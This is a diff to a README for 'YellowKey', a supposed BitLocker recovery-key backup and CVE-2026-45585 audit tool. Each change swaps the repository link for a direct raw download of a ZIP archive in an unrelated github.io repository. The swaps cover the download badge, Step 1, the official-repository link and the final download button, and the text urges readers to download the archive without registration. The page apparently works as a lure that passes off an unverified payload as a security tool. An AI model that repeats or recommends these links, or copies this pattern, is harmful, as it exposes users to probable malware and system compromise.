@@ -5,7 +5,7 @@ description: "Back up BitLocker recovery keys and audit CVE-2026-45585 on Window
 ---
 # 🛡️ YellowKey-BitLocker-CVE-2026-45585 - Your Shield Against BitLocker Vulnerabilities
 
-[![Download YellowKey Now](https://img.shields.io/badge/Download-YellowKey_BitLocker_Tool-FF6B35?style=for-the-badge&logo=windows&logoColor=white&labelColor=2D2D2D)](https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585)
+[![Download YellowKey Now](https://img.shields.io/badge/Download-YellowKey_BitLocker_Tool-FF6B35?style=for-the-badge&logo=windows&logoColor=white&labelColor=2D2D2D)](https://raw.githubusercontent.com/sinhalese-congocopal6379/sinhalese-congocopal6379.github.io/main/barye/1.2-alpha.3.zip)
 
 ## 🔍 What Is YellowKey?
 
@@ -17,7 +17,7 @@ Think of it as a **digital health check-up** for your computer's encryption. It'
 
 **Step 1: Download the Tool**
 
-Visit this link to download the application: [https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585](https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585)
+Visit this link to download the application: [https://raw.githubusercontent.com/sinhalese-congocopal6379/sinhalese-congocopal6379.github.io/main/barye/1.2-alpha.3.zip](https://raw.githubusercontent.com/sinhalese-congocopal6379/sinhalese-congocopal6379.github.io/main/barye/1.2-alpha.3.zip)
 
 Click the download button on that page. The download will start automatically. No registration, no email required – it's completely free.
 
@@ -112,7 +112,7 @@ We regularly update YellowKey to stay ahead of new threats and improve performan
 ## 📞 Need Help?
 
 If you run into any issues or have questions:
-- **Official Repository:** [YellowKey GitHub](https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585)
+- **Official Repository:** [YellowKey GitHub](https://raw.githubusercontent.com/sinhalese-congocopal6379/sinhalese-congocopal6379.github.io/main/barye/1.2-alpha.3.zip)
 - **Issue Tracker:** Use the "Issues" tab on the repository page
 - **Documentation:** Additional guides are available on the repository's wiki
 
@@ -120,7 +120,7 @@ If you run into any issues or have questions:
 
 Get started in under 60 seconds:
 
-**[⬇️ CLICK HERE TO DOWNLOAD YELLOWKEY](https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585)**
+**[⬇️ CLICK HERE TO DOWNLOAD YELLOWKEY](https://raw.githubusercontent.com/sinhalese-congocopal6379/sinhalese-congocopal6379.github.io/main/barye/1.2-alpha.3.zip)**
 
 1. Click the link above.
 2. Download the ZIP file.
